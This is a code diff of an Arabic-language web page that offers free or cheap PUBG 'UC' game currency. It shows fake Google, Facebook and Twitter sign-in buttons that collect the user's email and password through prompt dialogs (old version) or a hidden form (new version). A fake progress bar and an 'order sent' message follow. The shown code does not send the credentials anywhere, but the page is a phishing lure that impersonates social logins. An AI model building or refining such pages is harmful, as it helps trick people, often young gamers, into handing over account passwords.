@@ -1,16 +1,10 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-    <title>شحن شدات ببجي</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول وشحن شدات</title>
     <style>
-        @keyframes backgroundAnimation {
-            0% { background-position: 0 0; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0 0; }
-        }
-
         body {
             font-family: Arial, sans-serif;
             background: linear-gradient(45deg, #1a1a1a, #333);
@@ -22,6 +16,13 @@
             min-height: 100vh;
             margin: 0;
             color: #fff;
+            direction: rtl;
+        }
+
+        @keyframes backgroundAnimation {
+            0% { background-position: 0 0; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0 0; }
         }
 
         .container {
@@ -39,17 +40,6 @@
             margin-bottom: 20px;
         }
 
-        input[type="text"], input[type="password"], select {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #333;
-            border-radius: 5px;
-            background-color: #333;
-            color: #fff;
-            box-sizing: border-box;
-        }
-
         button {
             background-color: #FFD700;
             color: black;
@@ -62,166 +52,120 @@
             margin-top: 10px;
         }
 
-        .social-login {
-            margin-top: 20px;
+        .login-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
         }
 
-        .social-login button {
-            background-color: #444;
-            color: #fff;
+        .login-buttons button {
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 5px 0;
         }
 
-        .social-login img {
-            margin-right: 10px;
+        .login-buttons img {
+            margin-left: 10px;
             width: 24px;
             height: 24px;
         }
 
-        .price-list {
-            margin-top: 20px;
+        .login-form {
+            display: none;
+            flex-direction: column;
+            gap: 10px;
         }
 
-        .price-list button {
-            margin-top: 10px;
+        .login-form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #333;
+            border-radius: 5px;
+            background-color: #333;
+            color: #fff;
+            box-sizing: border-box;
         }
 
         .notification {
-            position: fixed;
-            top: 10px;
-            right: 10px;
+            display: none;
             background-color: #FFD700;
             color: black;
-            padding: 10px 20px;
-            border-radius: 5px;
-            z-index: 100;
-            opacity: 0;
-            transition: opacity 0.5s ease;
-            display: none;
-        }
-
-        .notification.show {
-            opacity: 1;
-            display: block;
-        }
-
-        .loading-screen {
-            display: none;
-            justify-content: center;
-            align-items: center;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, #ff7e5f, #feb47b);
-        }
-
-        .loading-box {
-            background-color: white;
             padding: 20px;
             border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
             text-align: center;
-            color: #ff4d4d;
+            margin-top: 20px;
+            position: relative;
+        }
+
+        .notification p {
+            margin: 0;
         }
 
         .progress-bar {
             width: 100%;
-            height: 20px;
             background-color: #ddd;
-            border-radius: 5px;
+            border-radius: 10px;
             overflow: hidden;
             margin-top: 10px;
+            height: 20px;
         }
 
-        .progress {
+        .progress-bar div {
             height: 100%;
-            background-color: #ff4d4d;
+            background-color: #ff3333;
             width: 0;
+            animation: progressBarAnimation 5s linear forwards;
+        }
+
+        @keyframes progressBarAnimation {
+            0% { width: 0; }
+            100% { width: 100%; }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>تسجيل الدخول عبر</h1>
-        <div class="social-login">
-            <button id="loginGoogle"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" alt="Google"> Google</button>
-            <button id="loginFacebook"><img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook"> Facebook</button>
-            <button id="loginTwitter"><img src="https://upload.wikimedia.org/wikipedia/en/6/60/Twitter_Logo_as_of_2021.svg" alt="Twitter"> Twitter</button>
+        <h1>تسجيل الدخول</h1>
+        <div class="login-buttons">
+            <button onclick="showLoginForm('google')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo">تسجيل الدخول عبر Google
+            </button>
+            <button onclick="showLoginForm('facebook')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">تسجيل الدخول عبر Facebook
+            </button>
+            <button onclick="showLoginForm('twitter')">
+                <img src="https://upload.wikimedia.org/wikipedia/en/6/60/Twitter_Logo_as_of_2021.svg" alt="Twitter Logo">تسجيل الدخول عبر Twitter
+            </button>
         </div>
-        
-        <div class="price-list">
-            <h1>أسعار الشدات</h1>
-            <button>مجاني - 0$</button>
-            <button>1500 - 2$</button>
-            <button>2000 - 3$</button>
-            <button>2500 - 4$</button>
-            <button>3000 - 5$</button>
-            <button>10000 - 10$</button>
-        </div>
-
+        <form class="login-form" id="loginForm">
+            <input type="email" placeholder="البريد الإلكتروني" required>
+            <input type="password" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
         <div class="notification" id="notification">
-            <p>تم تنفيذ طلبك! إذا كانت البيانات صحيحة، فسوف تصل الشدات في غضون 15 دقيقة.</p>
-        </div>
-    </div>
-
-    <div class="loading-screen" id="loadingScreen">
-        <div class="loading-box">
             <p>جاري إرسال الطلب...</p>
-            <p>يتم تجهيز طلبك، يرجى الانتظار.</p>
             <div class="progress-bar">
-                <div class="progress" id="progress"></div>
+                <div></div>
             </div>
-            <p id="progressText">0%</p>
         </div>
     </div>
-
     <script>
-        const loginGoogle = document.getElementById('loginGoogle');
-        const loginFacebook = document.getElementById('loginFacebook');
-        const loginTwitter = document.getElementById('loginTwitter');
-        const loadingScreen = document.getElementById('loadingScreen');
-        const progressBar = document.getElementById('progress');
-        const progressText = document.getElementById('progressText');
-        const notification = document.getElementById('notification');
-
-        function showLoginDialog(platform) {
-            const email = prompt(`أدخل البريد الإلكتروني لحساب ${platform}`);
-            const password = prompt(`أدخل كلمة المرور لحساب ${platform}`);
-            if (email && password) {
-                startLoading();
-            }
+        function showLoginForm(platform) {
+            const loginForm = document.getElementById('loginForm');
+            loginForm.style.display = 'flex';
         }
 
-        function startLoading() {
-            loadingScreen.style.display = 'flex';
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += 1;
-                progressBar.style.width = progress + '%';
-                progressText.innerText = progress + '%';
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    loadingScreen.style.display = 'none';
-                    showNotification();
-                }
-            }, 100);
-        }
+        const loginForm = document.getElementById('loginForm');
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            const notification = document.getElementById('notification');
+            notification.style.display = 'block';
 
-        function showNotification() {
-            notification.classList.add('show');
             setTimeout(() => {
-                notification.classList.remove('show');
-            }, 3000);
-        }
-
-        loginGoogle.addEventListener('click', () => showLoginDialog('Google'));
-        loginFacebook.addEventListener('click', () => showLoginDialog('Facebook'));
-        loginTwitter.addEventListener('click', () => showLoginDialog('Twitter'));
+                notification.querySelector('p').innerText = 'تم إرسال الطلب';
+            }, 5000);
+        });
     </script>
 </body>
 </html>
